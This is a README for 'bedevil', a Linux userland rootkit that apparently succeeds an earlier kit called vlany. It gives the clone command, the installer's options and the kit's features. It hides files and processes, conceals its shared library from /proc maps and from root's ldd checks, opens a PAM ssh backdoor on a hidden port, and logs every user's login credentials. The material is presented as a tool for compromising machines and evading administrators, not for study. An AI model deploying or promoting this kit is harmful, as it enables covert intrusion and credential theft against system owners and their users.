# bedevil

###### Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
<i>bedevil is designed to be more robust, faster and efficient than vlany.</i>
<hr>

### Aim of bedevil</br>
I made an effort to minimalise the amount of dependencies required to install the kit</br>
on a machine. In bedevil, many aspects are of the same likeness as compared to vlany,</br>
but many systems have been completely overhauled. It is now easier to add new hooks,</br>
and the assignment of user variables are parsed dynamically from the library header files.</br>
</br>
The method of patching the dynamic linker libraries has remained in bedevil, but however</br>
instead of using a python script to do the work for us, I made a rendition of the
[patch_ld.py](https://github.com/mempodippy/vlany/blob/master/misc/patch_ld.py) script, but in bash.</br>
This script is faster and accomplishes more in less lines of code.
<hr>

### Mandatory 'module' files
 * std_includes
 * module_includes
 * lib_hooks
 * prehook.c

__std_includes:__ list of standard headers to include for the shared library</br>
__module_includes:__ list of custom headers to include</br>
__lib_hooks:__ a list of library symbols to hook, along with their respective library names</br>
__prehook.c:__ a file containing the constructor and destructor code for the shared library
<hr>

### bedevil.sh
`git clone https://github.com/naworkcaj/bdvl.git && cd bdvl`
```
$ ./bedevil.sh -h

 /$$                       /$$                      /$$ /$$
| $$                      | $$                     |__/| $$
| $$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$    /$$ /$$| $$
| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$|  $$  /$$/| $$| $$
| $$  \ $$| $$$$$$$$| $$  | $$| $$$$$$$$ \  $$/$$/ | $$| $$
| $$  | $$| $$_____/| $$  | $$| $$_____/  \  $$$/  | $$| $$
| $$$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$   \  $/   | $$| $$
|_______/  \_______/ \_______/ \_______/    \_/    |__/|__/




Usage: ./bedevil.sh [ -h | -v | -d | -f | -D | -c | -C | -i]
        -h: Show this help message and exit.
        -v: Toggle verbose output.
        -d: Populate rootkit headers with user data.
        -f: Toggle use of preconfigured settings file.
            You will be prompted for a file location during
            installation. This can be a local url or via http.
        -D: Install all potential required dependencies.
        -c: Make gxqB2LRtGkbh.so in current directory and exit.
            bdvl.c and awesome_modules must be present.
        -C: Clean up installation/compilation mess and exit.
        -i: Launch full installation of bedevil. You will be
            prompted for input when needed.


```
<b>P.S.:</b></br>The 'preconfigured settings file' is essentially a list of settings seperated</br>
by newlines, and a colon on every line. The format is as follows:</br>
`newbd_uname:??BD_UNAME??` - It is still experimental.</br></br>
You do not have to manually run `./bedevil.sh -D`</br>
The installation process will ask you if you want to install potential</br>
dependencies before it fully installs itself on the box.
<hr>

#### File/process hiding:
Processes and files are hidden using magic GIDs. Although the magic GID method is somewhat</br>
deprecated, it remains the fastest and the most simple. If you should fear that using this kit</br>
and it's method will lead to you being discovered by some elite sys-admin, maybe you shouldn't be</br>
using this kit.</br>

#### Library presence hiding
bedevil hides itself from any process map files. Reading /proc/$$/maps, /proc/$$/smaps, or</br>
/proc/$$/numa_maps when the kit is installed will make it seem apparent that there are no other</br>
potentially malicious libraries being loaded into userspace.</br>
</br>
Calling `ldd` on any dynamic binaries will not immediately reveal the location of the rootkit's</br>
shared library. Calling `ldd` as a regular user will throw a read/write error, and calling `ldd` as</br>
root user will grant us sufficient permissions to quickly uninstall and reinstall the rootkit after</br>
showing a 'clean' ldd output to the root user. Further fogging the location of the rootkit's library.

#### Backdoor
bedevil uses PAM hooks as a backdoor to allow said user access to the machine</br>
over ssh, should they know the backdoor username and password. You setup</br>
access to this backdoor during installation, and I recommend connecting with</br>
your selected hidden PAM port so that you are hidden from netstat and the likes.</br>
Credential strings in the library are obfuscated using xor. All this does is hide plaintext</br>
strings from `strings` output.</br>
</br>
bedevil's PAM hooks also log authenicated user credentials whenever they log into</br>
their accounts. Credentials (username & password) are logged in your hidden directory</br>
in a file called 'auth_logs'. vlany had this same ability. I intend to build upon it.</br>

